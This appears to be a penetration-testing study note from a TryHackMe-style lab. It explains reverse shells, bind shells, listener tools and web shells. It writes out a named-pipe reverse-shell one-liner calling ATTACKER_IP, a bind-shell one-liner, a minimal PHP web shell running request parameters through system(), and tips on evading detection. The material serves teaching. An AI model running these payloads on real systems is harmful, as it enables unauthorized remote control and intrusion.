# What is a Shell?
A shell is a piece of software that allows a user to interact with an Operating System (OS). While it can be a Graphical User Interface (GUI), in the context of cybersecurity and hacking, it almost always refers to a **Command-Line Interface (CLI)**.

## The Cybersecurity Context
When discussing attacks, obtaining a "shell" refers to a specific, active session that an attacker establishes on a compromised target system. This session grants them the ability to type commands, execute software, and manipulate the OS remotely just as if they were sitting at the physical keyboard.

## Attacker Activities via Shell Access
Once an attacker obtains a shell, it serves as a foothold to execute a variety of malicious objectives.

| Activity | Description |
| :--- | :--- |
| **Remote System Control** | Executing commands or running software remotely on the compromised target machine. |
| **Privilege Escalation** | If the initial shell has limited permissions (e.g., a standard user account), the attacker will explore the system for misconfigurations or vulnerabilities to gain administrative (`root` or `Administrator`) access. |
| **Data Exfiltration** | Exploring the file system to locate, read, package, and secretly copy sensitive data out of the target network. |
| **Persistence (Maintenance Access)** | Modifying the system to ensure the attacker can regain access easily if the initial shell is disconnected. This includes creating rogue user credentials or installing backdoor software. |
| **Post-Exploitation Activities** | A broad range of activities conducted after initial access is granted, such as deploying malware (like ransomware), creating hidden accounts, or deleting logs to cover their tracks. |
| **Pivoting (Lateral Movement)** | Using the compromised machine as a launchpad or "pivot point" to scan and attack other, otherwise inaccessible systems on the same internal network. |
# Reverse Shells
A reverse shell (or "connect back shell") is one of the most popular attack techniques for gaining system access. Unlike a traditional connection, a reverse shell initiates the connection *from* the compromised target system *back to* the attacker's machine. 

* **The Tactical Advantage:** Firewalls are typically configured to block unauthorized incoming traffic but often allow outgoing traffic. By forcing the target system to reach out to the attacker, the connection easily bypasses inbound firewall restrictions.

## Step 1: Setting up the Listener (Attacker Side)
Before executing the attack, the attacker must set up a tool to wait for the incoming connection. **Netcat (`nc`)** is the standard utility for this.

    -- Attacker Terminal: Setting up the listener
    attacker@kali:~$ nc -lvnp 443
    listening on [any] 443 ...

**Netcat Command Breakdown:**
* **`-l`**: **L**isten mode (tells Netcat to wait for a connection rather than initiate one).
* **`-v`**: **V**erbose mode (provides detailed output when the connection occurs).
* **`-n`**: **N**umeric-only IPs (prevents Netcat from doing DNS lookups, speeding up the connection).
* **`-p`**: **P**ort specification (tells Netcat which port to listen on).

> **Stealth Tactic:** Attackers usually listen on common ports like 53, 80, or 443. This helps the reverse shell blend in with legitimate DNS or HTTPS web traffic, evading network security appliances.

## Step 2: Executing the Payload (Target Side)
Once the listener is active, the attacker exploits a vulnerability on the target to execute a payload. This payload forces the target's internal shell to expose itself over the network and connect to the attacker.

**Example Payload: Linux Named Pipe Reverse Shell**
`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f`

| Command Segment | Explanation |
| :--- | :--- |
| `rm -f /tmp/f` | Force-removes any existing file at this location to prevent conflicts. |
| `mkfifo /tmp/f` | Creates a "named pipe" (FIFO - first-in, first-out), which acts as a two-way conduit for input and output. |
| `cat /tmp/f` | Reads data out of the named pipe (waiting for input from the attacker). |
| `\| sh -i 2>&1` | Pipes that input into an interactive shell (`sh -i`). The `2>&1` redirects standard error to standard output so the attacker can see error messages. |
| `\| nc IP PORT` | Pipes the shell's output through Netcat directly back to the attacker's IP and Port. |
| `>/tmp/f` | Sends the final output back into the named pipe, completing the loop for bi-directional communication. |

## Step 3: Receiving the Shell
When the payload executes on the target, it reaches out. The attacker's Netcat listener catches the connection, dropping the attacker directly into the target's operating system as if they were sitting at the terminal.

    -- Attacker Terminal: Catching the shell
    connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964
    To run a command as administrator (user "root"), use "sudo ".
    See "man sudo_root" for details.

    target@tryhackme:~$

# Bind Shells
A bind shell is an attack technique where the compromised system opens (or "binds") a specific port and actively listens for an incoming connection. Once a connection is made, the system exposes its shell session to the attacker.

* **The Use Case:** This method is highly effective when the target machine has strict outbound firewall rules that prevent a reverse shell from reaching back out to the attacker.
* **The Disadvantage:** It is generally less popular because leaving a rogue port open and actively listening on a compromised machine is highly conspicuous and easily flagged by blue teams or security appliances.

## Step 1: Setting up the Listener (Target Side)
The attacker must first execute a payload on the target machine that opens a port and attaches the shell interface to it.

**Example Payload: Linux Named Pipe Bind Shell**

    rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f

| Command Segment | Explanation |
| :--- | :--- |
| `rm -f /tmp/f` | Force-removes any existing file at this location to prevent conflicts. |
| `mkfifo /tmp/f` | Creates a "named pipe" (FIFO) to act as a two-way conduit for input and output. |
| `cat /tmp/f` | Reads data out of the named pipe (waiting for the attacker's input). |
| `\| bash -i 2>&1` | Pipes the input to an interactive shell (`bash -i`). The `2>&1` redirects standard error to standard output, ensuring error messages are sent back to the attacker. |
| `\| nc -l 0.0.0.0 8080` | Starts Netcat in listen mode (`-l`) on all network interfaces (`0.0.0.0`) specifically on port `8080`. *(Note: Ports below 1024 require elevated privileges, so 8080 bypasses this).* |
| `> /tmp/f` | Sends the command output back into the named pipe, completing the loop for bidirectional communication. |

## Step 2: Connecting to the Shell (Attacker Side)
Now that the target is actively listening on the designated port, the attacker simply initiates a connection to it from their own machine using Netcat.

    -- Attacker Terminal: Initiating the connection
    nc -nv 10.10.13.37 8080

**Netcat Command Breakdown:**
* **`nc`**: Invokes the Netcat utility.
* **`-n`**: Disables DNS resolution, speeding up the connection and avoiding unnecessary DNS logs.
* **`-v`**: Enables Verbose mode, providing a confirmation message when the connection is successfully established.

When executed, the attacker is instantly dropped into the target's operating system:

    -- Attacker Terminal (Receiving the shell)
    attacker@kali:~$ nc -nv 10.10.13.37 8080 
    (UNKNOWN) [10.10.13.37] 8080 (http-alt) open
    target@tryhackme:~$
# Reverse Shell Listeners: Beyond Netcat
While standard Netcat (`nc`) is the most common utility for catching a reverse shell, there are alternative tools that offer enhanced functionality, improved stability, and encryption.

## 1. Rlwrap
A small utility that uses the GNU `readline` library. Standard Netcat shells are often "dumb" shells, meaning they lack basic terminal features (like using the arrow keys to scroll through command history or move the cursor). `rlwrap` wraps the connection to fix this, providing a much smoother user experience.

**Usage:** Simply prepend `rlwrap` to your standard Netcat command.

    -- Wrapping Netcat to enable arrow keys and history
    attacker@kali:~$ rlwrap nc -lvnp 443
    listening on [any] 443 ...

## 2. Ncat
Distributed by the NMAP project, `ncat` is a modernized, heavily upgraded version of Netcat. Its most significant advantage for penetration testers is the ability to natively encrypt the shell connection via SSL, which helps evade detection by Network Intrusion Detection Systems (NIDS).

**Usage (Standard Listener):**

    attacker@kali:~$ ncat -lvnp 4444
    Ncat: Version 7.94SVN ( https://nmap.org/ncat )
    Ncat: Listening on [::]:4444
    Ncat: Listening on 0.0.0.0:4444

**Usage (Encrypted Listener with SSL):**

    -- The --ssl option generates a temporary RSA key to encrypt the traffic
    attacker@kali:~$ ncat --ssl -lvnp 4444
    Ncat: Version 7.94SVN ( https://nmap.org/ncat )
    Ncat: Generating a temporary 2048-bit RSA key...
    Ncat: SHA-1 fingerprint: B7AC F999 7FB0 9FF9 14F5 5F12 6A17 B0DC B094 AB7F
    Ncat: Listening on [::]:4444
    Ncat: Listening on 0.0.0.0:4444

## 3. Socat
`socat` (Socket CAT) is a highly versatile networking utility that creates a bidirectional connection between two independent data sources (hosts). It is widely respected for its ability to produce incredibly stable, fully interactive shells when properly configured on both ends.

**Usage (Basic Listener):**

    attacker@kali:~$ socat -d -d TCP-LISTEN:443 STDOUT
    2024/09/23 15:44:38 socat[41135] N listening on AF=2 0.0.0.0:443

**Command Breakdown:**
* **`-d -d`**: Increases verbosity (using it twice ensures detailed output messages are printed).
* **`TCP-LISTEN:443`**: Establishes the server socket, listening for incoming TCP connections on port 443.
* **`STDOUT`**: Directs any incoming data received from the socket straight to your terminal's standard output so you can interact with it.

# Web Shells
A web shell is a malicious script written in a language supported by a compromised web server (such as PHP, ASP, JSP, or CGI). Once uploaded, it allows an attacker to execute commands on the underlying operating system directly through the web server itself. They are often hidden within a compromised web application, making them difficult to detect.

## How a Basic Web Shell Works
Attackers typically upload the web shell file by exploiting vulnerabilities like Unrestricted File Upload, File Inclusion (LFI/RFI), or Command Injection.

**Example: A Simple PHP Web Shell**
    
    <?php
    if (isset($_GET['cmd'])) {
        system($_GET['cmd']);
    }
    ?>

If this script is saved as `shell.php` and successfully uploaded to the target server, the attacker can execute commands by passing them to the `cmd` parameter via an HTTP GET request.
    
* **Execution URL:** `http://victim.com/uploads/shell.php?cmd=whoami`
* **Result:** The server receives the request, executes the `whoami` command, and displays the output directly in the attacker's web browser.

## Popular Existing Web Shells
Because web servers support powerful scripting languages, attackers have developed highly advanced web shells with extensive graphical user interfaces (GUIs) and built-in tools to streamline their post-exploitation activities.

| Web Shell       | Description                                                                                                                          |
| :-------------- | :----------------------------------------------------------------------------------------------------------------------------------- |
| **p0wny-shell** | A minimalistic, single-file PHP web shell that mimics a real terminal interface for remote command execution.                        |
| **b374k shell** | A feature-rich PHP web shell offering advanced file management, command execution, and various system enumeration tools.             |
| **c99 shell**   | A historically well-known, highly robust PHP web shell packed with extensive functionality for file manipulation and server control. |